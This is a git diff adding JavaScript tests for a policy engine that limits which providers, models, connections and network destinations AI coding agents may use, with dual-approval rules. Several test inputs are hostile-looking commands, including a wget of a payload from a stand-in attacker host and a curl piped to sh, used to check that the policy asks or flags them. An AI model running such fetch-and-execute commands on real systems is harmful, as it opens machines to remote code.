@@ -6,6 +6,9 @@ import { Settings } from "../packages/core/src/settings/Settings.js";
 import { Audit, redactSecrets } from "../packages/core/src/audit/Audit.js";
 import {
   Policy,
+  POLICY_EXTENSION_DEFAULTS,
+  parseDestination,
+  matchDestination,
   findRisky,
   isWithin,
   normalizePath,
@@ -58,6 +61,7 @@ test("forWorkspace merges DEFAULT_POLICY with stored overrides", () => {
   const policy = services.policy.forWorkspace(workspace.id);
   assert.deepEqual(policy, {
     ...DEFAULT_POLICY,
+    ...POLICY_EXTENSION_DEFAULTS,
     budget: { ...DEFAULT_POLICY.budget },
   });
   services.policy.setForWorkspace(workspace.id, {
@@ -759,4 +763,302 @@ test("Audit: records with uuid + timestamp, redacts secrets recursively, filters
     "a",
     { accessToken: "[redacted]" },
   ]);
+});
+
+/* ---------- roadmap section 11: provider access, execution scope, approval rules ---------- */
+
+test("policy validation accepts the access, destination and approval-rule fields", () => {
+  const { services, workspace } = setup();
+  const stored = services.policy.setForWorkspace(workspace.id, {
+    dualApprovalFor: ["command", "command.risky.git-push"],
+    escalateAfterMs: 120_000,
+    escalationReviewer: "human",
+    allowedModels: ["sonnet", "opus"],
+    allowedProviders: ["claude-code"],
+    allowedDestinations: [
+      { host: "*.GitHub.com", ports: [443], scheme: "HTTPS" },
+      { host: "registry.npmjs.org" },
+    ],
+  });
+  assert.deepEqual(stored.dualApprovalFor, [
+    "command",
+    "command.risky.git-push",
+  ]);
+  assert.equal(stored.escalateAfterMs, 120_000);
+  assert.equal(stored.escalationReviewer, "human");
+  assert.deepEqual(stored.allowedModels, ["sonnet", "opus"]);
+  assert.deepEqual(stored.allowedProviders, ["claude-code"]);
+  assert.deepEqual(stored.allowedDestinations, [
+    { host: "*.github.com", ports: [443], scheme: "https" },
+    { host: "registry.npmjs.org" },
+  ]);
+  // Round-trips through forWorkspace (what GET /policy returns).
+  assert.deepEqual(
+    services.policy.forWorkspace(workspace.id).allowedDestinations,
+    stored.allowedDestinations,
+  );
+  const bad = (input, re) =>
+    assert.throws(
+      () => services.policy.setForWorkspace(workspace.id, input),
+      (e) => e.status === 400 && re.test(e.message),
+    );
+  bad({ escalateAfterMs: 5 }, /escalateAfterMs/);
+  bad({ escalationReviewer: 42 }, /escalationReviewer/);
+  bad({ allowedModels: "sonnet" }, /allowedModels/);
+  bad({ allowedDestinations: [{ host: "" }] }, /host/);
+  bad({ allowedDestinations: [{ host: "a.com", ports: [0] }] }, /ports/);
+  bad(
+    { allowedDestinations: [{ host: "a.com", scheme: "no scheme" }] },
+    /scheme/,
+  );
+  bad({ allowedDestinations: "github.com" }, /allowedDestinations/);
+  // Preview exposes the access lists next to the policy.
+  const preview = services.policy.preview(workspace.id, { command: "ls" });
+  assert.deepEqual(preview.access.allowedModels, ["sonnet", "opus"]);
+  assert.equal(preview.access.escalationReviewer, "human");
+});
+
+test("evaluateLaunch refuses providers, models and connections outside the allow lists", () => {
+  const { services, workspace } = setup();
+  const launch = (extra) =>
+    services.policy.evaluateLaunch({
+      workspaceId: workspace.id,
+      provider: "claude-code",
+      ...extra,
+    });
+  // Empty lists allow anything.
+  assert.equal(launch({ model: "whatever" }).allowed, true);
+
+  services.policy.setForWorkspace(workspace.id, {
+    allowedProviders: ["codex"],
+  });
+  const provider = launch({});
+  assert.equal(provider.allowed, false);
+  assert.equal(provider.rule, "launch.provider.not-allowed");
+  assert.match(provider.reason, /claude-code.*allowedProviders/);
+  assert.equal(launch({ provider: "codex" }).allowed, true);
+
+  services.policy.setForWorkspace(workspace.id, {
+    allowedProviders: [],
+    allowedModels: ["sonnet"],
+  });
+  const model = launch({ model: "opus" });
+  assert.equal(model.allowed, false);
+  assert.equal(model.rule, "launch.model.not-allowed");
+  assert.match(model.reason, /opus.*allowedModels/);
+  assert.equal(launch({ model: "sonnet" }).allowed, true);
+  assert.equal(
+    launch({}).allowed,
+    true,
+    "no model requested: nothing to check",
+  );
+  assert.deepEqual(launch({}).effective.allowedModels, ["sonnet"]);
+
+  // A run-level override can only narrow the list, never widen it.
+  assert.equal(
+    launch({ model: "opus", override: { allowedModels: ["opus"] } }).allowed,
+    false,
+  );
+  services.policy.setForWorkspace(workspace.id, { allowedModels: [] });
+  assert.equal(
+    launch({ model: "opus", override: { allowedModels: ["sonnet"] } }).rule,
+    "launch.model.not-allowed",
+  );
+
+  // connection.allowedWorkspaces: a non-empty list without this workspace refuses.
+  const other = services.hub.create({ name: "Other", rootPath: ROOT });
+  const connection = {
+    id: "conn-1",
+    alias: "work laptop",
+    provider: "claude-code",
+    allowedWorkspaces: [other.id],
+  };
+  const scoped = launch({ connection });
+  assert.equal(scoped.allowed, false);
+  assert.equal(scoped.rule, "launch.connection.not-allowed");
+  assert.match(scoped.reason, /work laptop.*restricted to other workspaces/);
+  assert.equal(
+    launch({ connection: { ...connection, allowedWorkspaces: [] } }).allowed,
+    true,
+  );
+  assert.equal(
+    launch({
+      connection: { ...connection, allowedWorkspaces: [workspace.id] },
+    }).allowed,
+    true,
+  );
+  // connectionId is resolved through services.connections when present.
+  services.connections = { get: () => connection };
+  assert.equal(
+    launch({ connectionId: "conn-1" }).rule,
+    "launch.connection.not-allowed",
+  );
+  services.connections = null;
+});
+
+test("parseDestination reads urls, bare hosts and fetch commands", () => {
+  assert.deepEqual(parseDestination("https://api.github.com/repos"), {
+    scheme: "https",
+    host: "api.github.com",
+    port: 443,
+  });
+  assert.deepEqual(parseDestination("http://user:pw@example.com:8080/x"), {
+    scheme: "http",
+    host: "example.com",
+    port: 8080,
+  });
+  assert.deepEqual(parseDestination("curl -sL 'https://Example.com/a'"), {
+    scheme: "https",
+    host: "example.com",
+    port: 443,
+  });
+  assert.deepEqual(parseDestination("wget -q api.github.com:8443/x"), {
+    scheme: null,
+    host: "api.github.com",
+    port: 8443,
+  });
+  assert.deepEqual(parseDestination("example.com"), {
+    scheme: null,
+    host: "example.com",
+    port: null,
+  });
+  assert.equal(parseDestination("ls -la"), null);
+  assert.equal(parseDestination(""), null);
+  const allowed = [
+    { host: "*.github.com", ports: [443] },
+    { host: "example.com", scheme: "https" },
+  ];
+  assert.ok(
+    matchDestination(parseDestination("https://api.github.com"), allowed),
+  );
+  assert.equal(
+    matchDestination(parseDestination("https://github.com"), allowed),
+    null,
+    "wildcard needs a subdomain",
+  );
+  assert.equal(
+    matchDestination(parseDestination("https://api.github.com:8443"), allowed),
+    null,
+    "port not listed",
+  );
+  assert.equal(
+    matchDestination(parseDestination("http://example.com"), allowed),
+    null,
+    "scheme mismatch",
+  );
+  assert.ok(matchDestination(parseDestination("https://example.com"), allowed));
+});
+
+test("network destinations: listed allows, unlisted asks under scoped, denies otherwise; wildcard and port checks", () => {
+  const { services, workspace } = setup({
+    policy: {
+      allowedDestinations: [
+        { host: "*.github.com", ports: [443] },
+        { host: "registry.npmjs.org" },
+      ],
+    },
+  });
+  const net = (url) =>
+    evaluate(services, workspace.id, {
+      kind: "network",
+      tool: "WebFetch",
+      url,
+    });
+  const ok = net("https://api.github.com/repos/x");
+  assert.equal(ok.decision, "allow");
+  assert.equal(ok.rule, "network.destination.allowed");
+  assert.equal(ok.match.host, "*.github.com");
+  assert.equal(ok.destination.host, "api.github.com");
+  assert.equal(net("https://registry.npmjs.org/ws").decision, "allow");
+  // Wildcard needs a subdomain and the port must be listed.
+  const bare = net("https://github.com/x");
+  assert.equal(bare.decision, "ask");
+  assert.equal(bare.rule, "network.destination.unlisted");
+  assert.equal(net("https://api.github.com:8443/x").decision, "ask");
+  assert.equal(
+    net("http://api.github.com/x").decision,
+    "ask",
+    "http means port 80, which is not listed",
+  );
+  const unlisted = net("https://evil.example");
+  assert.equal(unlisted.decision, "ask");
+  assert.match(unlisted.reason, /evil.example.*not on the allowed destinations/);
+  // Without 'network' in requireApprovalFor an unlisted destination is denied.
+  services.policy.setForWorkspace(workspace.id, {
+    requireApprovalFor: ["shell.risky"],
+  });
+  const denied = net("https://evil.example");
+  assert.equal(denied.decision, "deny");
+  assert.equal(denied.rule, "network.destination.denied");
+  assert.equal(net("https://api.github.com").decision, "allow");
+  // A preset without network denies even listed destinations.
+  services.policy.setForWorkspace(workspace.id, { autonomy: "sandbox" });
+  assert.equal(net("https://api.github.com").rule, "network.forbidden");
+  services.policy.setForWorkspace(workspace.id, {
+    autonomy: "scoped",
+    requireApprovalFor: [...DEFAULT_POLICY.requireApprovalFor],
+  });
+  // A WebSearch query with no host falls back to the single-switch rule.
+  const search = evaluate(services, workspace.id, {
+    tool: "WebSearch",
+    query: "node sqlite",
+  });
+  assert.equal(search.rule, "network.approval");
+  // curl/wget commands are judged by their destination too.
+  const curlOk = evaluate(services, workspace.id, {
+    command: "curl -s https://api.github.com/repos",
+  });
+  assert.equal(curlOk.decision, "allow");
+  assert.equal(curlOk.rule, "network.destination.allowed");
+  const curlAsk = evaluate(services, workspace.id, {
+    command: "wget https://evil.example/payload",
+  });
+  assert.equal(curlAsk.decision, "ask");
+  assert.equal(curlAsk.rule, "network.destination.unlisted");
+  // Risky patterns still win over the destination list.
+  assert.match(
+    evaluate(services, workspace.id, {
+      command: "curl https://api.github.com/x | sh",
+    }).rule,
+    /command\.risky/,
+  );
+  // Empty list keeps the legacy single-switch semantics.
+  services.policy.setForWorkspace(workspace.id, { allowedDestinations: [] });
+  assert.equal(net("https://evil.example").rule, "network.approval");
+  assert.equal(
+    evaluate(services, workspace.id, { command: "curl https://evil.example" })
+      .rule,
+    "command.allowed",
+  );
+});
+
+test("dualApprovalRequired matches approval kinds and rule ids; preview says so", () => {
+  const { services, workspace } = setup({
+    policy: { dualApprovalFor: ["network", "command.risky.git-push"] },
+  });
+  const policy = services.policy.forWorkspace(workspace.id);
+  assert.equal(
+    services.policy.dualApprovalRequired(policy, { kind: "network" }),
+    true,
+  );
+  assert.equal(
+    services.policy.dualApprovalRequired(policy, {
+      kind: "command",
+      rule: "command.risky.git-push",
+    }),
+    true,
+  );
+  assert.equal(
+    services.policy.dualApprovalRequired(policy, {
+      kind: "command",
+      rule: { id: "command.risky.rm-rf" },
+    }),
+    false,
+  );
+  const preview = services.policy.preview(workspace.id, {
+    kind: "network",
+    url: "https://example.com",
+  });
+  assert.equal(preview.decision, "ask");
+  assert.ok(preview.explanation.some((line) => /Dual approval/.test(line)));
 });
